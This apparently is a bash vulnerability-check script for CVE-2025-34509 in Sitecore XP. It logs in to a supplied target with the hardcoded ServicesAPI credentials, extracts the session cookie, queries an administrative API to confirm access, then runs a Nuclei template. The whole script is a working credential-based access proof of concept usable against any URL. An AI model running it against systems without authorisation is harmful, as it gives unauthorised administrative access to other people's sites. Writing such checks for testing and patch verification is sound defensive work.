#!/bin/bash

# CVE-2025-34509 Vulnerability Test Script
# Tests the hardcoded ServicesAPI credentials in Sitecore XP

TARGET_URL=${1:-"http://localhost:8080/sitecore"}
VERBOSE=${2:-"false"}

echo "üîç Testing CVE-2025-34509 - Sitecore Hardcoded Credentials"
echo "Target: $TARGET_URL"
echo "=========================================="

# Test 1: Check if Sitecore is running
echo "üì° Testing Sitecore availability..."
if curl -s -I "$TARGET_URL" | grep -q "200 OK"; then
    echo "‚úÖ Sitecore is running"
else
    echo "‚ùå Sitecore is not accessible at $TARGET_URL"
    echo "Please ensure Sitecore is running and accessible"
    exit 1
fi

# Test 2: Test hardcoded credentials authentication
echo "üîê Testing hardcoded ServicesAPI credentials..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/api/ssc/auth/login" \
    -H "Content-Type: application/json" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"domain":"sitecore","username":"ServicesAPI","password":"b"}')

if echo "$LOGIN_RESPONSE" | grep -q '"success":true'; then
    echo "‚úÖ Authentication successful with hardcoded credentials"

    # Extract session cookie
    SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -o 'ASP.NET_SessionId=[^;]*' | head -1)
    echo "üç™ Session cookie extracted: ${SESSION_COOKIE:0:50}..."

    # Test 3: Test administrative API access
    echo "üîß Testing administrative API access..."
    API_RESPONSE=$(curl -s -H "Cookie: $SESSION_COOKIE" \
        "$TARGET_URL/api/sitecore/ItemService/GetChildren?sc_itemid={110D559F-DEA5-42EA-9C1C-8A5DF7E70EF9}&sc_lang=en&sc_apikey=")

    if echo "$API_RESPONSE" | grep -q "Sitecore"; then
        echo "‚úÖ Administrative API access confirmed"
        echo "üéØ VULNERABILITY CONFIRMED: CVE-2025-34509"

        if [ "$VERBOSE" = "true" ]; then
            echo ""
            echo "üìã Detailed Response:"
            echo "Login Response:"
            echo "$LOGIN_RESPONSE" | jq . 2>/dev/null || echo "$LOGIN_RESPONSE"
            echo ""
            echo "API Response:"
            echo "$API_RESPONSE" | jq . 2>/dev/null || echo "$API_RESPONSE"
        fi
    else
        echo "‚ùå Administrative API access failed"
        echo "Response: $API_RESPONSE"
    fi
else
    echo "‚ùå Authentication failed with hardcoded credentials"
    echo "Response: $LOGIN_RESPONSE"
    echo ""
    echo "Possible reasons:"
    echo "- Sitecore version is not vulnerable (not 10.1-10.4.1)"
    echo "- ServicesAPI account is not present"
    echo "- Password is not 'b'"
    echo "- Domain is not 'sitecore'"
fi

echo ""
echo "üß™ Testing with Nuclei template..."
if command -v nuclei &> /dev/null; then
    nuclei -t http/cves/2025/CVE-2025-34509.yaml -u "$TARGET_URL" -v
else
    echo "‚ùå Nuclei not found. Please install nuclei to test with the template"
    echo "Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
fi

echo ""
echo "=========================================="
echo "Testing completed!"
